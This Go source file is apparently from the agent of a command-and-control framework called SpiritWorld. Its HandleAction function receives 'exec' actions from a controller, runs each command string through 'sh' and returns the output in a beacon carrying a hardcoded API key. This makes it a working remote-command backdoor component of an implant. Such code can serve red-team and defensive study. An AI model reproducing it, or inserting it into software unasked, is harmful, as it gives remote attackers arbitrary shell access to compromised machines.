package actionhandler

import (
	"errors"
	"fmt"
	"os/exec"
	"strings"

	"github.com/f1rehaz4rd/SpiritWorld/agent/pkg/agents"
)

func HandleAction(agent agents.Agent, action agents.Action) (agents.AgentBeacon, error) {

	var beaconObj agents.AgentBeacon

	switch action.ActionType {
	case "exec":
		action.ActionOutput = executeCommand(action.ActionCmd)
		beaconObj.Agent = &agent
		beaconObj.Action = &action
		beaconObj.APIKEY = agents.AGENTAPIKEY
		return beaconObj, nil
	case "beacon":
		if action.ActionOutput != "success" {
			fmt.Println("Error")
		}
		return beaconObj, errors.New("done")
	default:
		break
	}

	return beaconObj, errors.New("wrong")
}

func executeCommand(input string) string {
	var output string

	cmd := exec.Command("sh")
	cmd.Stdin = strings.NewReader(input)

	byteOutput, err := cmd.Output()
	if err != nil {
		output = fmt.Sprint(err)
	} else {
		output = string(byteOutput)
	}

	return output
}
